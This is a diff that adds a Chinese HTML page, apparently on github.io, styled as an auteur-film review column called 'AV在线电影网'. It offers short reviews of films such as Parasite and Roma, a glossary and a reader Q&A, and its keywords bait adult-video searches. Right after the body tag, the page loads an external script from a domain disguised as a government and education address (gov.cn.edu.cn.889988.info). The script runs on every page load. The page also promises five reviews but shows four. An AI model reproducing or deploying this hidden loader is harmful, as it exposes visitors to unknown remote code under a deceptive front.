@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AV在线电影网 | 独立电影与作者影像评论，作者风格影片在线选片指南</title>
+<meta name="keywords" content="AV在线电影网,AV电影推荐,独立电影在线看,作者电影评论,艺术院线影片,小众文艺片推荐">
+<meta name="description" content="AV在线电影网，专注独立电影与作者影像的影片评论与选片指南。收录全球艺术院线、小众文艺与作者风格影片，配以导演风格、视听语言与主题解读，帮你在海量片源里找到真正值得看的独立制作。">
+<link rel="canonical" href="https://AVzaixiandianyingwang-zh.github.io/">
+<style>
+:root{
+  --paper:#f2efe8;--paper2:#e8e3d8;--ink:#1b1a18;--ink2:#423f39;--mute:#8b857a;
+  --plum:#6b2d4f;--plum2:#8e3f68;--olive:#3f4a2c;--line:#d6cfbe;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"Helvetica Neue","Arial","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.85;
+  -webkit-tap-highlight-color:transparent;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none;}
+button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit;}
+ul{list-style:none;}
+::selection{background:var(--plum);color:#fff;}
+
+.wrap{max-width:1140px;margin:0 auto;padding:0 32px;}
+.mono{font-family:"Courier New",Courier,monospace;}
+
+/* header band */
+.band{background:var(--plum);color:#f4efea;padding:10px 0;}
+.band .wrap{display:flex;justify-content:space-between;font-size:11px;letter-spacing:.16em;text-transform:uppercase;flex-wrap:wrap;gap:10px;}
+
+header{border-bottom:6px double var(--ink);padding:30px 0 22px;}
+.head{display:grid;grid-template-columns:auto 1fr auto;gap:40px;align-items:end;}
+.logo{display:flex;flex-direction:column;gap:2px;}
+.logo .av{font-size:54px;font-weight:900;letter-spacing:-2px;line-height:.9;}
+.logo .av i{font-style:normal;color:var(--plum);}
+.logo .cn{font-size:12px;letter-spacing:.5em;margin-top:6px;color:var(--ink2);}
+.head .center{border-left:1px solid var(--line);padding-left:34px;}
+.head .center .tag{font-size:10px;letter-spacing:.3em;color:var(--plum);text-transform:uppercase;}
+.head .center h2{font-size:16.5px;font-weight:400;color:var(--ink2);margin-top:8px;line-height:1.7;}
+.head .date{text-align:right;font-size:12px;color:var(--mute);line-height:2;}
+.head .date b{display:block;font-size:15px;color:var(--ink);font-weight:700;letter-spacing:.06em;}
+
+nav{background:var(--ink);}
+.nav{display:flex;}
+.nav a{padding:14px 20px;font-size:11.5px;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:#dcd7ce;border-right:1px solid #35332e;transition:.15s;white-space:nowrap;}
+.nav a:first-child{border-left:1px solid #35332e;}
+.nav a:hover{background:var(--plum);color:#fff;}
+.nav a.act{background:var(--plum2);color:#fff;}
+.burger{display:none;margin-left:auto;padding:0 20px;color:#dcd7ce;font-size:12px;font-weight:700;letter-spacing:.14em;}
+
+section{padding:104px 0;}
+.eyebrow{display:flex;align-items:center;gap:12px;font-size:10.5px;letter-spacing:.3em;text-transform:uppercase;color:var(--plum);font-weight:700;margin-bottom:18px;}
+.eyebrow::after{content:"";flex:1;height:1px;background:var(--line);}
+h2.sec{font-size:44px;font-weight:900;letter-spacing:-1.4px;line-height:1.1;margin-bottom:14px;}
+.sec-note{font-size:15px;color:var(--ink2);max-width:620px;line-height:1.95;margin-bottom:54px;}
+
+/* review opener */
+.opener{display:grid;grid-template-columns:1.15fr .85fr;gap:54px;align-items:start;}
+.opener .num{font-size:120px;font-weight:900;line-height:.82;color:var(--plum);}
+.opener .statement{font-size:25px;font-weight:700;letter-spacing:-.5px;line-height:1.55;margin-top:6px;}
+.opener .statement em{font-style:normal;color:var(--plum2);}
+.opener .body{font-size:15.5px;color:var(--ink2);line-height:2;}
+.opener .body p+p{margin-top:16px;}
+.credits{margin-top:28px;border-top:2px solid var(--ink);}
+.credits dl{display:grid;grid-template-columns:78px 1fr;font-size:12.5px;border-bottom:1px solid var(--line);}
+.credits dt{padding:9px 0;color:var(--mute);text-transform:uppercase;letter-spacing:.1em;font-weight:700;}
+.credits dd{padding:9px 0;color:var(--ink2);}
+.opener .poster{background:var(--paper2);border:1px solid var(--line);padding:18px;}
+.poster .frame{background:linear-gradient(160deg,#3a352e,#1b1a18);color:#e8e3d8;aspect-ratio:3/4;display:grid;place-items:center;text-align:center;padding:24px;}
+.poster .frame .rating{font-size:13px;letter-spacing:.2em;color:#c9a227;}
+.poster .frame .quote{font-size:19px;font-weight:700;line-height:1.6;font-style:italic;margin:16px 0;}
+.poster .frame .dir{font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:#a89e8e;}
+.poster .cap{display:flex;justify-content:space-between;font-size:11px;color:var(--mute);margin-top:12px;font-family:"Courier New",monospace;}
+
+/* reviews */
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border-top:2px solid var(--ink);}
+.rev{border-bottom:1px solid var(--line);padding:34px 34px 34px 0;}
+.grid .rev:nth-child(odd){padding-right:38px;border-right:1px solid var(--line);}
+.grid .rev:nth-child(even){padding-left:38px;}
+.rev .row{display:flex;justify-content:space-between;align-items:baseline;gap:14px;}
+.rev .yr{font-size:11px;letter-spacing:.2em;color:var(--plum);font-weight:700;font-family:"Courier New",monospace;}
+.rev .star{font-size:12px;color:#c9a227;letter-spacing:.1em;white-space:nowrap;}
+.rev h3{font-size:27px;font-weight:900;letter-spacing:-.7px;margin:10px 0 4px;}
+.rev .sub{font-size:12px;color:var(--mute);letter-spacing:.06em;margin-bottom:14px;}
+.rev p{font-size:15px;color:var(--ink2);line-height:1.95;}
+.rev .pull{margin:16px 0 0;padding-left:14px;border-left:3px solid var(--plum);font-size:14.5px;font-style:italic;color:var(--plum2);line-height:1.8;}
+
+/* voices */
+.voices{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+.voice{background:var(--paper2);padding:24px 22px;border-top:4px solid var(--plum);}
+.voice .role{font-size:10.5px;letter-spacing:.22em;text-transform:uppercase;color:var(--mute);}
+.voice h4{font-size:20px;font-weight:900;margin:8px 0 12px;letter-spacing:-.4px;}
+.voice p{font-size:14px;color:var(--ink2);line-height:1.9;}
+.voice .sign{margin-top:16px;padding-top:12px;border-top:1px dashed var(--line);font-size:11px;color:var(--plum);font-family:"Courier New",monospace;}
+
+/* glossary */
+.gloss{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line);}
+.term{background:var(--paper);padding:26px 24px;}
+.term b{display:block;font-size:16px;letter-spacing:-.2px;margin-bottom:8px;}
+.term span{font-size:14.5px;color:var(--ink2);line-height:1.9;}
+.term em{font-style:normal;display:block;margin-top:12px;font-size:11px;color:var(--plum);font-family:"Courier New",monospace;}
+
+/* qa */
+.qa{border-top:2px solid var(--ink);}
+.qa details{border-bottom:1px solid var(--ink);}
+.qa summary{cursor:pointer;padding:24px 0;display:flex;gap:24px;align-items:baseline;list-style:none;font-size:18px;font-weight:700;letter-spacing:-.3px;transition:.15s;}
+.qa summary::-webkit-details-marker{display:none;}
+.qa summary .n{font-family:"Courier New",monospace;font-size:13px;color:var(--plum);font-weight:700;min-width:30px;}
+.qa summary::after{content:"＋";margin-left:auto;color:var(--mute);font-size:20px;transition:.3s;}
+.qa details[open] summary::after{transform:rotate(45deg);}
+.qa summary:hover{color:var(--plum);}
+.qa .a{padding:0 0 26px 54px;font-size:15.5px;color:var(--ink2);line-height:1.95;max-width:840px;}
+
+footer{background:var(--ink);color:#c6c0b5;padding:68px 0 0;}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px;padding-bottom:44px;}
+.foot .lg{font-size:22px;font-weight:900;color:#fff;letter-spacing:-.5px;}
+.foot .lg i{font-style:normal;color:var(--plum2);}
+.foot p{font-size:14px;color:#807a6f;margin-top:14px;max-width:340px;line-height:1.9;}
+.foot h5{font-size:11px;letter-spacing:.24em;text-transform:uppercase;color:#e8e3d8;margin-bottom:16px;}
+.foot ul{display:grid;gap:9px;}
+.foot a{color:#a39c90;font-size:13.5px;transition:.15s;}
+.foot a:hover{color:#fff;}
+.colophon{padding:20px 0;border-top:1px solid #35332e;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:11.5px;color:#6b655a;font-family:"Courier New",monospace;}
+.colophon b{color:#e8e3d8;font-weight:700;}
+.colophon a{color:#e8e3d8;}
+.colophon a:hover{color:#fff;}
+
+@media(max-width:1000px){
+  .opener{grid-template-columns:1fr;gap:36px;}
+  .head{grid-template-columns:1fr;text-align:left;gap:22px;}
+  .head .center{border-left:0;padding-left:0;border-top:1px solid var(--line);padding-top:18px;}
+  .head .date{text-align:left;}
+  .grid{grid-template-columns:1fr;}
+  .grid .rev:nth-child(odd){padding-right:0;border-right:0;}
+  .grid .rev:nth-child(even){padding-left:0;}
+  .voices{grid-template-columns:repeat(2,1fr);}
+  .gloss{grid-template-columns:repeat(2,1fr);}
+}
+@media(max-width:720px){
+  .nav{display:none;flex-direction:column;}
+  .nav.open{display:flex;}
+  .nav a{border-right:0;border-left:0!important;border-bottom:1px solid #35332e;text-align:center;}
+  .burger{display:block;}
+  .logo .av{font-size:40px;}
+  h2.sec{font-size:31px;}
+  .opener .num{font-size:84px;}
+  .opener .statement{font-size:20px;}
+  .voices{grid-template-columns:1fr;}
+  .gloss{grid-template-columns:1fr;}
+  .foot{grid-template-columns:1fr 1fr;gap:30px;}
+  section{padding:74px 0;}
+}
+@media(max-width:420px){
+  .foot{grid-template-columns:1fr;}
+  .logo .av{font-size:34px;}
+  h2.sec{font-size:27px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="band"><div class="wrap"><span>独立电影评论栏目 · 作者影像选片指南</span><span>Vol. 12 / 2026</span></div></div>
+
+<header><div class="wrap">
+  <div class="head">
+    <div class="logo"><span class="av"><i>AV</i>在线</span><span class="cn">电影网 · AUTEUR VISION</span></div>
+    <div class="center">
+      <div class="tag">本期卷首 · Opening Statement</div>
+      <h2>作者论（Auteur Theory）认为，真正的好电影里能辨认出导演本人的笔迹——AV 在这里是 Auteur Vision 的缩写，也是本栏目判断一部片值不值得看的唯一标准。</h2>
+    </div>
+    <div class="date"><b>2026 . 05 . 28</b><span>星期四 · 第 12 卷</span></div>
+  </div>
+</div></header>
+
+<nav><div class="wrap"><div class="nav" id="nav">
+  <a href="#home" class="act">卷首</a>
+  <a href="#reviews">本期评论</a>
+  <a href="#voices">栏目分工</a>
+  <a href="#gloss">概念手册</a>
+  <a href="#qa">读者来信</a>
+</div><button class="burger" id="burger">MENU</button></div></nav>
+
+<section class="opener" id="home">
+  <div class="wrap" style="display:block;">
+    <div class="num">01</div>
+    <div class="statement">所谓作者电影，就是<em>同一个导演</em>拍十部片，你也能认出那是他的手——这种可辨认的个人印记，比题材、明星、甚至剧情更靠得住。</div>
+    <div class="body">
+      <p>AV在线电影网是一个独立电影评论栏目，专门给作者风格明显的影片写评论、做选片。我们不按票房排榜单，只按「导演本人的痕迹」筛片：镜头怎么摆、演员怎么调度、一场对话怎么剪，这些细节决定了它是流水线产品还是作者表达。</p>
+      <p>本页收录的片目都标了产地、导演、年份与一句明确的价值判断，方便你快速决定要不要花两小时。全部内容均为评论与解读，不提供任何影片资源，正版资源请前往各授权平台查询。</p>
+    </div>
+    <div class="credits">
+      <dl><dt>主编</dt><dd>作者影像编辑部</dd><dt>栏目</dt><dd>卷首 · 本期评论 · 概念手册</dd><dt>更新</dt><dd>每周三更新一篇长评</dd><dt>投稿</dt><dd>接受 800 字以上独立片评论</dd></dl>
+    </div>
+  </div>
+  <div class="wrap" style="display:block;margin-top:40px;">
+  <div class="poster">
+    <div class="frame">
+      <div class="rating">★ ★ ★ ★ ☆</div>
+      <div class="quote">"一部电影的作者性，藏在它最不起眼的三个镜头里。"</div>
+      <div class="dir">本 期 封 面 语</div>
+    </div>
+    <div class="cap"><span>COVER / 2026</span><span>NO. 12</span></div>
+  </div>
+  </div>
+</section>
+
+<section id="reviews" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="eyebrow">Section 02 — 本期评论</div>
+    <h2 class="sec">五篇长评，<br>五种作者笔迹</h2>
+    <p class="sec-note">每篇评论给一句明确判断，并附导演手法、主题落点与我们为什么推荐它。影评默认涉及关键情节，未观影者建议先看过再看。</p>
+    <div class="grid">
+      <article class="rev"><div class="row"><span class="yr">2023 · 日本</span><span class="star">★★★★☆</span></div><h3>怪物</h3><div class="sub">是枝裕和 / 是枝裕和式群像叙事</div><p>三段视角讲同一个事件，真正的狠处不在反转，而在每段视角里成年人都在用自己的理解覆盖孩子的真实。是枝把"大人永远在误读"这件事拍得极其温柔，也因此更刺人。</p><div class="pull">关键判断：这是一部关于"谁有资格解释真相"的电影，而非悬疑片。</div></article>
+      <article class="rev"><div class="row"><span class="yr">2018 · 美国</span><span class="star">★★★★★</span></div><h3>罗马</h3><div class="sub">阿方索·卡隆 / 长镜头与黑白影像</div><p>卡隆用几乎完全静止的长镜头还原童年记忆，人物的动作被框在画面里，像被命运按住。黑白不是怀旧，是去掉色彩之后的客观。</p><div class="pull">关键判断：自传体不一定要情绪外放，克制本身就是一种重量。</div></article>
+      <article class="rev"><div class="row"><span class="yr">2021 · 法国</span><span class="star">★★★★☆</span></div><h3>钛</h3><div class="sub">朱利亚·迪库诺 / 身体恐怖与作者叙事</div><p>极端的身体叙事背后是一则关于身份被强行命名的寓言。前半段的不适感是设计好的，它逼你思考"当身体不再属于自己时，我还在不在"。</p><div class="pull">关键判断：不适是手段，不是目的，撑过前半小时才有后劲。</div></article>
+      <article class="rev"><div class="row"><span class="yr">2019 · 韩国</span><span class="star">★★★★★</span></div><h3>寄生虫</h3><div class="sub">奉俊昊 / 空间调度与社会寓言</div><p>上下两个空间不是布景而是角色，每一次上下楼都在完成一次阶级判断。奉俊昊把类型片的节奏塞进社会议题里，笑点和刺痛同时发生。</p><div class="pull">关键判断：少有的一部把"阶层"拍成空间关系的商业作者片。</div></article>
+    </div>
+  </div>
+</section>
+
+<section id="voices">
+  <div class="wrap">
+    <div class="eyebrow">Section 03 — 栏目分工</div>
+    <h2 class="sec">四个固定栏目，<br>四种读法</h2>
+    <p class="sec-note">本栏目不是一个大而全的片库，而是四个分工明确的固定单元。你可以只读其中一块，也能连起来看。</p>
+    <div class="voices">
+      <div class="voice"><div class="role">每周三</div><h4>本期评论</h4><p>单部影片 1500 字左右的长评，重点写导演手法与作者印记，不写剧情复述。</p><div class="sign">slot / weekly-review</div></div>
+      <div class="voice"><div class="role">每月一更</div><h4>作者谱系</h4><p>把一个导演的三到五部作品横向比对，看他反复使用的母题、镜头与演员。</p><div class="sign">slot / auteur-line</div></div>
+      <div class="voice"><div class="role">不定期</div><h4>冷门挖矿</h4><p>专门找在主流榜单上排不进前列的小成本独立片，只按完成度推荐。</p><div class="sign">slot / deep-cut</div></div>
+      <div class="voice"><div class="role">每季度</div><h4>季度重看</h4><p>把三年前写过的片子翻出来重看，写一版新判断，标注哪些观点改了。</p><div class="sign">slot / rewatch</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="gloss" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="eyebrow">Section 04 — 概念手册</div>
+    <h2 class="sec">六个被滥用的词，<br>我们这么用</h2>
+    <p class="sec-note">评论区最常吵起来的不是片好不好看，而是概念定义不一样。以下是本栏目固定使用的口径，方便你对着看。</p>
+    <div class="gloss">
+      <div class="term"><b>作者电影</b><span>影片可以清楚辨认出导演个人的主题偏好与形式特征，而不只是完成一个剧本。</span><em>口径：重形式印记</em></div>
+      <div class="term"><b>独立电影</b><span>以制作方式与资金来源为判定，不以题材或质量判定；低预算也可能拍得很套路。</span><em>口径：重制作路径</em></div>
+      <div class="term"><b>艺术院线</b><span>指发行渠道与放映场景，不等于"难看"，也不等于一定更深刻。</span><em>口径：重发行渠道</em></div>
+      <div class="term"><b>文艺片</b><span>中文语境里的模糊标签，本栏目尽量避免单独使用，会改写成具体特征。</span><em>口径：尽量不用</em></div>
+      <div class="term"><b>长镜头</b><span>一段不加剪辑的连续拍摄。它是手段不是目的，滥用只会造成观影负担。</span><em>口径：看效果</em></div>
+      <div class="term"><b>隐喻</b><span>必须能在片中找到至少两处呼应，才配叫隐喻；出现一次那只是巧合。</span><em>口径：需交叉验证</em></div>
+    </div>
+  </div>
+</section>
+
+<section id="qa">
+  <div class="wrap">
+    <div class="eyebrow">Section 05 — 读者来信</div>
+    <h2 class="sec">被问得最多的<br>五个问题</h2>
+    <div class="qa">
+      <details>
+        <summary><span class="n">01</span>AV 是指什么？</summary>
+        <div class="a">本栏目里的 AV 是 Auteur Vision（作者影像）的缩写，指以导演为创作核心的作者电影。栏目名称中的"AV在线"是这一用法的固定写法，所有内容均围绕独立电影评论展开。</div>
+      </details>
+      <details>
+        <summary><span class="n">02</span>为什么找不到在线观看入口？</summary>
+        <div class="a">本栏目是评论与选片指南，不提供在线播放、资源下载或任何盗版链接。片源信息请自行前往正版授权平台查询，我们只负责判断这片值不值得你花时间。</div>
+      </details>
+      <details>
+        <summary><span class="n">03</span>五星标准是什么？</summary>
+        <div class="a">五星不等于"好看"。标准是：导演的个人印记是否清晰、形式与主题是否互相支撑、看完之后你是否还愿意想它。完成度高但毫无个人印记的片，我们一般给四星以下。</div>
+      </details>
+      <details>
+        <summary><span class="n">04</span>评论会剧透吗？</summary>
+        <div class="a">会，默认剧透。长评的价值在于拆解结构与手法，这些都必须提到关键情节。没看过的片子建议先观影再看评论。</div>
+      </details>
+      <details>
+        <summary><span class="n">05</span>可以投稿吗？</summary>
+        <div class="a">可以。接受 800 字以上的独立片评论，要求有明确的价值判断和具体的镜头分析，不接受纯情绪抒发或剧情复述。投稿通过后会在栏目中署名。</div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="lg"><i>AV</i>在线电影网</div>
+        <p>独立电影与作者影像评论栏目，以导演手法、视听语言与主题解读为核心，做有判断的选片指南。</p>
+      </div>
+      <div><h5>栏目</h5><ul><li><a href="#home">卷首</a></li><li><a href="#reviews">本期评论</a></li><li><a href="#voices">栏目分工</a></li><li><a href="#gloss">概念手册</a></li></ul></div>
+      <div><h5>读法</h5><ul><li><a href="#">每周三长评</a></li><li><a href="#">作者谱系</a></li><li><a href="#">冷门挖矿</a></li><li><a href="#">季度重看</a></li></ul></div>
+      <div><h5>联系</h5><ul><li><a href="#qa">读者来信</a></li><li><a href="#">投稿须知</a></li><li><a href="#">评论口径</a></li><li><a href="#">版权声明</a></li></ul></div>
+    </div>
+    <div class="colophon">
+      <span>© 2026 AV在线电影网 · AUTEUR VISION 独立电影评论栏目 · Set in Helvetica &amp; Courier</span>
+      <span>官方入口：<a href="https://AVzaixiandianyingwang-zh.github.io">https://AVzaixiandianyingwang-zh.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A'&&window.innerWidth<=720){nav.classList.remove('open');}});
+</script>
+</body>
+</html>
